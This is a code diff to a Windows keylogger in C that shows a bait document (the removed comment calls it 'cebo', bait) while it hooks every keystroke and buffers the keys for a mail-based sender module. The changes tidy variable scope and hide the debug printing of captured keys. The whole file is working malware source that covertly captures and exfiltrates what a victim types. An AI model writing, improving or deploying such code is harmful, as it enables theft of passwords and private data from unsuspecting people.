@@ -3,15 +3,16 @@
 #include <windows.h>
 #include "mailman.h"
 
-HHOOK keyboardHook;
+static HHOOK keyboardHook;
 
-unsigned char lAlt = 0, rAlt = 0, ignoreLAlt = 0, ignoreRAlt = 0;
-unsigned char lCtrl = 0, rCtrl = 0, ignoreLCtrl = 0, ignoreRCtrl = 0;
-unsigned char lShift = 0, rShift = 0, ignoreLShift = 0, ignoreRShift = 0;
+static unsigned char lAlt = 0, rAlt = 0, ignoreLAlt = 0, ignoreRAlt = 0;
+static unsigned char lCtrl = 0, rCtrl = 0, ignoreLCtrl = 0, ignoreRCtrl = 0;
+static unsigned char lShift = 0, rShift = 0, ignoreLShift = 0, ignoreRShift = 0;
 
 void processKey(const char* b) {
+#ifndef NDEBUG
     printf("%s\n", b);
-    //hacer llamada a función de creación de palabra
+#endif
     addKeyToBuffer(b);
 }
 
@@ -125,22 +126,17 @@ LRESULT CALLBACK hookCallback(int code, WPARAM wParam, LPARAM lParam) {
     return CallNextHookEx(keyboardHook, code, lParam, wParam);
 }
 
-
 //Main
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
-    //abir cebo
     ShellExecute(NULL, "open", KEYLOGGER_FAKE_DOCUMENT, NULL, NULL, SW_SHOWNORMAL);
-
     initSender();
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, hookCallback, hInstance, 0);
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
-        
     }
     UnhookWindowsHookEx(keyboardHook);
-    sendBuffer();
     CleanUpSender();
     return 0;
 }
